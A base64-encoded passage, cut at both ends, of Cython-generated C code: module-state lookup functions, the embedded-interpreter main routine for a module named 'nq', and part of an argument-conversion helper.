sZSogdGFibGUsXG4gICAgICAgIFB5X3NzaXplX3QgY291bnQsXG4gICAgICAgIGludDY0X3QgaW50ZXJwcmV0ZXJJZCkge1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGJlZ2luID0gdGFibGU7XG4gICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogZW5kID0gYmVnaW4gKyBjb3VudDtcbiAgICBpZiAoYmVnaW4tPmlkID09IGludGVycHJldGVySWQpIHtcbiAgICAgICAgcmV0dXJuIGJlZ2luO1xuICAgIH1cbiAgICB3aGlsZSAoKGVuZCAtIGJlZ2luKSA+IF9fUFlYX01PRFVMRV9TVEFURV9MT09LVVBfU01BTExfU0laRSkge1xuICAgICAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKiBoYWxmd2F5ID0gYmVnaW4gKyAoZW5kIC0gYmVnaW4pLzI7XG4gICAgICAgIGlmIChoYWxmd2F5LT5pZCA9PSBpbnRlcnByZXRlcklkKSB7XG4gICAgICAgICAgICByZXR1cm4gaGFsZndheTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoaGFsZndheS0+aWQgPCBpbnRlcnByZXRlcklkKSB7XG4gICAgICAgICAgICBiZWdpbiA9IGhhbGZ3YXk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBlbmQgPSBoYWxmd2F5O1xuICAgICAgICB9XG4gICAgfVxuICAgIGZvciAoOyBiZWdpbiA8IGVuZDsgKytiZWdpbikge1xuICAgICAgICBpZiAoYmVnaW4tPmlkID49IGludGVycHJldGVySWQpIHJldHVybiBiZWdpbjtcbiAgICB9XG4gICAgcmV0dXJuIGJlZ2luO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKENZVEhPTl9VTlVTRUQgdm9pZCogZHVtbXkpIHtcbiAgICBpbnQ2NF90IGludGVycHJldGVyX2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7XG4gICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gTlVMTDtcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSogZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqKV9fcHl4X2F0b21pY19wb2ludGVyX2xvYWRfcmVsYXhlZCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSk7XG4gICAge1xuICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpO1xuICAgICAgICBpZiAobGlrZWx5KGRhdGEpKSB7XG4gICAgICAgICAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEqIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTtcbiAgICAgICAgICAgIGlmIChsaWtlbHkoZGF0YSA9PSBuZXdfZGF0YSkpIHtcbiAgICAgICAgICAgICAgICBnb3RvIHJlYWRfZmluaXNoZWQ7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpO1xuICAgICAgICBfX3B5eF9hdG9taWNfaW5jcl9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9yZWFkX2NvdW50ZXIpO1xuICAgICAgICBkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9yZWxheGVkKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhKTtcbiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCk7XG4gICAgfVxuICByZWFkX2ZpbmlzaGVkOjtcbiNlbHNlXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKiBkYXRhID0gX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YTtcbiNlbmRpZlxuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGZvdW5kID0gTlVMTDtcbiAgICBpZiAodW5saWtlbHkoIWRhdGEpKSBnb3RvIGVuZDtcbiAgICBpZiAoZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHtcbiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgZGF0YS0+Y291bnQpIHtcbiAgICAgICAgICAgIGZvdW5kID0gZGF0YS0+dGFibGUraW50ZXJwcmV0ZXJfaWQ7XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBmb3VuZCA9IF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGVTdGF0ZUxvb2t1cFRhYmxlTG93ZXJCb3VuZChcbiAgICAgICAgICAgIGRhdGEtPnRhYmxlLCBkYXRhLT5jb3VudCwgaW50ZXJwcmV0ZXJfaWQpO1xuICAgIH1cbiAgZW5kOlxuICAgIHtcbiAgICAgICAgUHlPYmplY3QgKnJlc3VsdD1OVUxMO1xuICAgICAgICBpZiAoZm91bmQgJiYgZm91bmQtPmlkID09IGludGVycHJldGVyX2lkKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBmb3VuZC0+bW9kdWxlO1xuICAgICAgICB9XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICAgICAgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfcmVhZF9jb3VudGVyKTtcbiNlbmRpZlxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbn1cbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuc3RhdGljIHZvaWQgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKHZvaWQpIHtcbiAgICB3aGlsZSAoX19weXhfYXRvbWljX2xvYWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcikgIT0gMCk7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKVxuI2VuZGlmXG5zdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZUludGVycElkQXNJbmRleChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKipvbGRfZGF0YSwgUHlPYmplY3QqIG1vZHVsZSwgaW50NjRfdCBpbnRlcnByZXRlcl9pZCkge1xuICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkO1xuICAgIHdoaWxlICh0b19hbGxvY2F0ZSA8PSBpbnRlcnByZXRlcl9pZCkge1xuICAgICAgICBpZiAodG9fYWxsb2NhdGUgPT0gMCkgdG9fYWxsb2NhdGUgPSAxO1xuICAgICAgICBlbHNlIHRvX2FsbG9jYXRlICo9IDI7XG4gICAgfVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqbmV3X2RhdGEgPSAqb2xkX2RhdGE7XG4gICAgaWYgKHRvX2FsbG9jYXRlICE9ICgqb2xkX2RhdGEpLT5hbGxvY2F0ZWQpIHtcbiAgICAgICAgIG5ld19kYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKXJlYWxsb2MoXG4gICAgICAgICAgICAqb2xkX2RhdGEsXG4gICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSsodG9fYWxsb2NhdGUtMSkqc2l6ZW9mKF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUpKTtcbiAgICAgICAgaWYgKCFuZXdfZGF0YSkge1xuICAgICAgICAgICAgUHlFcnJfTm9NZW1vcnkoKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IG5ld19kYXRhLT5hbGxvY2F0ZWQ7IGkgPCB0b19hbGxvY2F0ZTsgKytpKSB7XG4gICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBpO1xuICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlO1xuICAgIH1cbiAgICBuZXdfZGF0YS0+dGFibGVbaW50ZXJwcmV0ZXJfaWRdLm1vZHVsZSA9IG1vZHVsZTtcbiAgICBpZiAobmV3X2RhdGEtPmNvdW50IDwgaW50ZXJwcmV0ZXJfaWQrMSkge1xuICAgICAgICBuZXdfZGF0YS0+Y291bnQgPSBpbnRlcnByZXRlcl9pZCsxO1xuICAgIH1cbiAgICAqb2xkX2RhdGEgPSBuZXdfZGF0YTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSkge1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKnJlYWQgPSBkYXRhLT50YWJsZTtcbiAgICBfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlICp3cml0ZSA9IGRhdGEtPnRhYmxlO1xuICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IHJlYWQgKyBkYXRhLT5jb3VudDtcbiAgICBmb3IgKDsgcmVhZDxlbmQ7ICsrcmVhZCkge1xuICAgICAgICBpZiAocmVhZC0+bW9kdWxlKSB7XG4gICAgICAgICAgICB3cml0ZS0+aWQgPSByZWFkLT5pZDtcbiAgICAgICAgICAgIHdyaXRlLT5tb2R1bGUgPSByZWFkLT5tb2R1bGU7XG4gICAgICAgICAgICArK3dyaXRlO1xuICAgICAgICB9XG4gICAgfVxuICAgIGRhdGEtPmNvdW50ID0gd3JpdGUgLSBkYXRhLT50YWJsZTtcbiAgICBmb3IgKDsgd3JpdGU8ZW5kOyArK3dyaXRlKSB7XG4gICAgICAgIHdyaXRlLT5pZCA9IDA7XG4gICAgICAgIHdyaXRlLT5tb2R1bGUgPSBOVUxMO1xuICAgIH1cbiAgICBkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCA9IDA7XG59XG5zdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZShQeU9iamVjdCogbW9kdWxlLCBDWVRIT05fVU5VU0VEIHZvaWQqIGR1bW15KSB7XG4gICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpO1xuICAgIGlmIChpbnRlcnByZXRlcl9pZCA9PSAtMSkgcmV0dXJuIC0xO1xuICAgIGludCByZXN1bHQgPSAwO1xuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKTtcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopXG4gICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhO1xuI2VuZGlmXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpuZXdfZGF0YSA9IG9sZF9kYXRhO1xuICAgIGlmICghbmV3X2RhdGEpIHtcbiAgICAgICAgbmV3X2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopY2FsbG9jKDEsIHNpemVvZihfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEpKTtcbiAgICAgICAgaWYgKCFuZXdfZGF0YSkge1xuICAgICAgICAgICAgcmVzdWx0ID0gLTE7XG4gICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICAgICAgZ290byBlbmQ7XG4gICAgICAgIH1cbiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IDE7XG4gICAgICAgIG5ld19kYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCA9IDE7XG4gICAgfVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycygpO1xuICAgIGlmIChuZXdfZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHtcbiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgX19QWVhfTU9EVUxFX1NUQVRFX0xPT0tVUF9TTUFMTF9TSVpFKSB7XG4gICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoJm5ld19kYXRhLCBtb2R1bGUsIGludGVycHJldGVyX2lkKTtcbiAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICB9XG4gICAgICAgIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KG5ld19kYXRhKTtcbiAgICB9XG4gICAge1xuICAgICAgICBQeV9zc2l6ZV90IGluc2VydF9hdCA9IDA7XG4gICAgICAgIHtcbiAgICAgICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKFxuICAgICAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZSwgbmV3X2RhdGEtPmNvdW50LCBpbnRlcnByZXRlcl9pZCk7XG4gICAgICAgICAgICBhc3NlcnQobG93ZXJfYm91bmQpO1xuICAgICAgICAgICAgaW5zZXJ0X2F0ID0gbG93ZXJfYm91bmQgLSBuZXdfZGF0YS0+dGFibGU7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaW5zZXJ0X2F0IDwgbmV3X2RhdGEtPmNvdW50ICYmIGxvd2VyX2JvdW5kLT5pZCA9PSBpbnRlcnByZXRlcl9pZCkpIHtcbiAgICAgICAgICAgICAgICBsb3dlcl9ib3VuZC0+bW9kdWxlID0gbW9kdWxlO1xuICAgICAgICAgICAgICAgIGdvdG8gZW5kOyAgLy8gYWxyZWFkeSBpbiB0YWJsZSwgbm90aGluZyBtb3JlIHRvIGRvXG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgaWYgKG5ld19kYXRhLT5jb3VudCsxID49IG5ld19kYXRhLT5hbGxvY2F0ZWQpIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAobmV3X2RhdGEtPmNvdW50KzEpKjI7XG4gICAgICAgICAgICBuZXdfZGF0YSA9XG4gICAgICAgICAgICAgICAgKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopcmVhbGxvYyhcbiAgICAgICAgICAgICAgICAgICAgbmV3X2RhdGEsXG4gICAgICAgICAgICAgICAgICAgIHNpemVvZihfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEpICtcbiAgICAgICAgICAgICAgICAgICAgKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7XG4gICAgICAgICAgICBpZiAoIW5ld19kYXRhKSB7XG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gLTE7XG4gICAgICAgICAgICAgICAgbmV3X2RhdGEgPSBvbGRfZGF0YTtcbiAgICAgICAgICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICAgICAgICAgIGdvdG8gZW5kO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlO1xuICAgICAgICB9XG4gICAgICAgICsrbmV3X2RhdGEtPmNvdW50O1xuICAgICAgICBpbnQ2NF90IGxhc3RfaWQgPSBpbnRlcnByZXRlcl9pZDtcbiAgICAgICAgUHlPYmplY3QgKmxhc3RfbW9kdWxlID0gbW9kdWxlO1xuICAgICAgICBmb3IgKFB5X3NzaXplX3QgaT1pbnNlcnRfYXQ7IGk8bmV3X2RhdGEtPmNvdW50OyArK2kpIHtcbiAgICAgICAgICAgIGludDY0X3QgY3VycmVudF9pZCA9IG5ld19kYXRhLT50YWJsZVtpXS5pZDtcbiAgICAgICAgICAgIG5ld19kYXRhLT50YWJsZVtpXS5pZCA9IGxhc3RfaWQ7XG4gICAgICAgICAgICBsYXN0X2lkID0gY3VycmVudF9pZDtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpjdXJyZW50X21vZHVsZSA9IG5ld19kYXRhLT50YWJsZVtpXS5tb2R1bGU7XG4gICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0ubW9kdWxlID0gbGFzdF9tb2R1bGU7XG4gICAgICAgICAgICBsYXN0X21vZHVsZSA9IGN1cnJlbnRfbW9kdWxlO1xuICAgICAgICB9XG4gICAgfVxuICBlbmQ6XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgbmV3X2RhdGEpO1xuI2Vsc2VcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gbmV3X2RhdGE7XG4jZW5kaWZcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkge1xuICAgIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQgPSBQeUludGVycHJldGVyU3RhdGVfR2V0SUQoX19QeXhfUHlJbnRlcnByZXRlclN0YXRlX0dldCgpKTtcbiAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHJldHVybiAtMTtcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCk7XG4jaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkVcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopXG4gICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7XG4jZWxzZVxuICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSA9IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGE7XG4jZW5kaWZcbiAgICBpZiAoZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXgpIHtcbiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgZGF0YS0+Y291bnQpIHtcbiAgICAgICAgICAgIGRhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gZG9uZTtcbiAgICB9XG4gICAge1xuICAgICAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKTtcbiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogbG93ZXJfYm91bmQgPSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoXG4gICAgICAgICAgICBkYXRhLT50YWJsZSwgZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTtcbiAgICAgICAgaWYgKCFsb3dlcl9ib3VuZCkgZ290byBkb25lO1xuICAgICAgICBpZiAobG93ZXJfYm91bmQtPmlkICE9IGludGVycHJldGVyX2lkKSBnb3RvIGRvbmU7XG4gICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IGRhdGEtPnRhYmxlK2RhdGEtPmNvdW50O1xuICAgICAgICBmb3IgKDtsb3dlcl9ib3VuZDxlbmQtMTsgKytsb3dlcl9ib3VuZCkge1xuICAgICAgICAgICAgbG93ZXJfYm91bmQtPmlkID0gKGxvd2VyX2JvdW5kKzEpLT5pZDtcbiAgICAgICAgICAgIGxvd2VyX2JvdW5kLT5tb2R1bGUgPSAobG93ZXJfYm91bmQrMSktPm1vZHVsZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICAtLWRhdGEtPmNvdW50O1xuICAgIGlmIChkYXRhLT5jb3VudCA9PSAwKSB7XG4gICAgICAgIGZyZWUoZGF0YSk7XG4gICAgICAgIGRhdGEgPSBOVUxMO1xuICAgIH1cbiAgZG9uZTpcbiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuICAgIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhLCBkYXRhKTtcbiNlbHNlXG4gICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSA9IGRhdGE7XG4jZW5kaWZcbiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTtcbiAgICByZXR1cm4gMDtcbn1cbiNlbmRpZlxuXG5cbiNpZmRlZiBfTVNDX1ZFUlxuI3ByYWdtYSB3YXJuaW5nKCBwb3AgKVxuI2VuZGlmXG5cblxuXG5cbiNlbmRpZiBcblxuI2lmZGVmIF9fRnJlZUJTRF9fXG4jaW5jbHVkZSA8ZGVkZS5oPlxuI2VuZGlmXG4jaWYgUFlfTUFKT1JfVkVSU0lPTiA8IDNcbmludCBtYWluKGludCBhcmdjLCBjaGFyKiogYXJndikge1xuI2VsaWYgZGVmaW5lZChXaW4zMikgfHwgZGVmaW5lZChNU19XSU5ET1dTKVxuaW50IHdtYWluKGludCBhcmdjLCB3Y2hhcl90ICoqYXJndikge1xuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfbWFpbihpbnQgYXJnYywgd2NoYXJfdCAqKmFyZ3YpIHtcbiNlbmRpZlxuI2lmZGVmIF9fRnJlZUJTRF9fXG4gICAgZnBfZXhjZXB0X3QgbTtcbiAgICBtID0gZnBnZXRtYXNrKCk7XG4gICAgZnBzZXRtYXNrKG0gJiB+RlBfWF9PRkwpO1xuI2VuZGlmXG4gICAgaWYgKGFyZ2MgJiYgYXJndilcbiAgICAgICAgUHlfU2V0UHJvZ3JhbU5hbWUoYXJndlswXSk7XG4gICAgUHlfSW5pdGlhbGl6ZSgpO1xuICAgIGlmIChhcmdjICYmIGFyZ3YpXG4gICAgICAgIFB5U3lzX1NldEFyZ3YoYXJnYywgYXJndik7XG4gICAge1xuICAgICAgUHlPYmplY3QqIG0gPSBOVUxMO1xuICAgICAgX19weXhfbW9kdWxlX2lzX21haW5fbnEgPSAxO1xuICAgICAgI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzXG4gICAgICAgICAgaW5pdG5xKCk7XG4gICAgICAjZWxpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVRcbiAgICAgICAgICBtID0gUHlJbml0X25xKCk7XG4gICAgICAgICAgaWYgKCFQeU1vZHVsZV9DaGVjayhtKSkge1xuICAgICAgICAgICAgICBQeU1vZHVsZURlZiAqbWRlZiA9IChQeU1vZHVsZURlZiAqKSBtO1xuICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kbmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKCJfX21haW5fXyIpO1xuICAgICAgICAgICAgICBtID0gTlVMTDtcbiAgICAgICAgICAgICAgaWYgKG1vZG5hbWUpIHtcbiAgICAgICAgICAgICAgICAgIG0gPSBQeU1vZHVsZV9OZXdPYmplY3QobW9kbmFtZSk7XG4gICAgICAgICAgICAgICAgICBQeV9ERUNSRUYobW9kbmFtZSk7XG4gICAgICAgICAgICAgICAgICBpZiAobSkgUHlNb2R1bGVfRXhlY0RlZihtLCBtZGVmKTtcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgIH1cbiAgICAgICNlbHNlXG4gICAgICAgICAgbSA9IFB5SW5pdF9ucSgpO1xuICAgICAgI2VuZGlmXG4gICAgICBpZiAoUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgICAgICAgIFB5RXJyX1ByaW50KCk7XG4gICAgICAgICAgI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzXG4gICAgICAgICAgaWYgKFB5X0ZsdXNoTGluZSgpKSBQeUVycl9DbGVhcigpO1xuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIHJldHVybiAxO1xuICAgICAgfVxuICAgICAgUHlfWERFQ1JFRihtKTtcbiAgICB9XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDYwMDAwXG4gICAgUHlfRmluYWxpemUoKTtcbiNlbHNlXG4gICAgaWYgKFB5X0ZpbmFsaXplRXgoKSA8IDApXG4gICAgICAgIHJldHVybiAyO1xuI2VuZGlmXG4gICAgcmV0dXJuIDA7XG59XG4jaWYgUFlfTUFKT1JfVkVSU0lPTiA+PSAzICYmICFkZWZpbmVkKFdpbjMyKSAmJiAhZGVmaW5lZChNU19XSU5ET1dTKVxuI2luY2x1ZGUgPGxvY2FsZS5oPlxuc3RhdGljIHdjaGFyX3QqXG5fX1B5eF9jaGFyMndjaGFyKGNoYXIqIGFyZylcbntcbiAgICB3Y2hhcl90ICpyZXM7XG4jaWZkZWYgSEFWRV9CUk9LRU5fTUJTVE9XQ1NcbiAgICBzaXplX3QgYXJnc2l6ZSA9IHN0cmxlbihhcmcpO1xuI2Vsc2VcbiAgICBzaXplX3QgYXJnc2l6ZSA9IG1ic3Rvd2NzKE5VTEwsIGFyZywgMCk7XG4jZW5kaWZcbiAgICBzaXplX3QgY291bnQ7XG4gICAgdW5zaWduZWQgY2hhciAqaW47XG4gICAgd2NoYXJfdCAqb3V0O1xuI2lmZGVmIEhBVkVfTUJSVE9XQ1xuICAgIG1ic3RhdGVfdCBtYnM7XG4jZW5kaWZcbiAgICBpZiAoYXJnc2l6ZSAhPSAoc2l6ZV90KS0xKSB7XG4gICAgICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChhcmdzaXplKzEpKnNpemVvZih3Y2hhcl90KSk7XG4gICAgICAgIGlmICghcmVzKVxuICAgICAgICAgICAgZ290byBvb207XG4gICAgICAgIGNvdW50ID0gbWJzdG93Y3MocmVzLCBhcmcsIGFyZ3NpemUrMSk7XG4gICAgICAgIGlmIChjb3VudCAhPSAoc2l6ZV90KS0xKSB7XG4gICAgICAgICAgICB3Y2hhcl90ICp0bXA7XG4gICAgICAgICAgICBmb3IgKHRtcCA9IHJlczsgKnRtcCAhPSAwICYmXG4gICAgICAgICAgICAgICAgICAgICAoKnRtcCA8IDB4ZDgwMCB8fCAqdG1wID4gMHhkZmZmKTsgdG1wKyspXG4gICAgICAgICAgICAgICAgO1xuICAgICAgICAgICAgaWYgKCp0bXAgPT0gMClcbiAgICAgICAgICAgICAgICByZXR1cm4gcmVzO1xuICAgICAgICB9XG4gICAgICAgIGZyZWUocmVzKTtcbiAgICB9XG4jaWZkZWYgSEFWRV9NQlJUT1dDXG4gICAgYXJnc2l6ZSA9IHN0cmxlbihhcmcpICsgMTtcbiAgICByZXMgPSAod2NoYXJfdCAqKW1hbGxvYyhhcmdzaXplKnNpemVvZih3Y2hhcl90KSk7XG4gICAgaWYgKCFyZXMpIGdvdG8gb29tO1xuICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZztcbiAgICBvdXQgPSByZXM7XG4gICAgbWVtc2V0KCZtYnMsIDAsIHNpemVvZiBtYnMpO1xuICAgIHdoaWxlIChhcmdzaXplKSB7XG4gICAgICAgIHNpemVfdCBjb252ZXJ0ZWQgPSBtYn